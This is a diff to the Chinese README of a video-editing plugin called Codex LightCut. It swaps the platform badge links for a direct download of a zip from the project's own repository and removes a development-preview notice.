@@ -3,8 +3,8 @@
 </p>
 
 <p align="center">
-  <a href="docs/platforms.md#macos"><img src="assets/platform-macos.svg" alt="macOS：本机流程已验证，尚无通用安装包。查看兼容说明。" width="49%"></a>
-  <a href="docs/platforms.md#windows"><img src="assets/platform-windows.svg" alt="Windows：R8.1 指定环境实机已验证，查看兼容范围。" width="49%"></a>
+  <a href="https://github.com/wangzhezbz/codex-lightcut/raw/refs/heads/main/downloads/LightCut-Mac-Windows-R82.zip"><img src="assets/platform-macos.svg" width="49%" alt="下载 Codex LightCut · macOS"></a>
+  <a href="https://github.com/wangzhezbz/codex-lightcut/raw/refs/heads/main/downloads/LightCut-Mac-Windows-R82.zip"><img src="assets/platform-windows.svg" width="49%" alt="下载 Codex LightCut · Windows"></a>
 </p>
 
 <p align="center">
@@ -32,7 +32,6 @@
 
 视频、字幕和音乐保留独立轨道。制作过程不主动打开剪映、不模拟键鼠；草稿登记遇到编辑器运行时等待自然退出。你可以继续工作，在方便时打开草稿检查和精修。
 
-> **开发预览。** 已公开完整插件包与集成引擎。两端指定环境已有剪辑样片验收，全新机器依赖安装、更多素材和版本仍需持续验证。
 
 ## 当前支持版本
 
